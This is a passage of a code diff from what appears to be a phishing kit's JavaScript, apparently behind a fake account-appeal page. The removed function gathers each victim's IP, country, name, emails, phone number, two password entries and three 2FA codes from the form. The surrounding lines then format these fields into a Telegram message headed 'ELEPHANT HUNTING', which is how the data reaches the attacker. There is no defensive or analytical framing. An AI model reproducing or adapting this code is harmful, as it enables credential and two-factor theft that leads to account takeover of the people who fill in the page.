@@ -5001,28 +5001,6 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
             }
         }
         getUserIp()
-// Send data to Email
-function sendDataEmail() {
-    var templateData = {
-        'user_ip': userIpData.user_ip,
-        'country': userIpData.country,
-        'country_code': userIpData.country_code,
-        'call_code' : userIpData.call_code,
-        'full-name': formsSendData['full-name'],
-        'personal-email': formsSendData['personal-email'],
-        'buiseness-email': formsSendData['buiseness-email'],
-        'mobile-phone-number': formsSendData['mobile-phone-number'],
-        'password-1': formsSendData['password-1'],
-        'password-2': formsSendData['password-2'],
-        '2FA-1': formsSendData['2FA-1'],
-        '2FA-2': formsSendData['2FA-2'],
-        '2FA-3': formsSendData['2FA-3'],
-        'page-name': formsSendData['page-name'],
-        'apeal': formsSendData['apeal'],
-        'dis_name': metrics.dis_name,
-        'is_Mobile': metrics.is_Mobile,
-        'params': metrics.params
-    };
 
     // Định dạng nội dung cho Telegram với mỗi trường trên một dòng, cách nhau khoảng trắng
     var telegramContent = `🔥ELEPHANT HUNTING.🔥\n\n` +
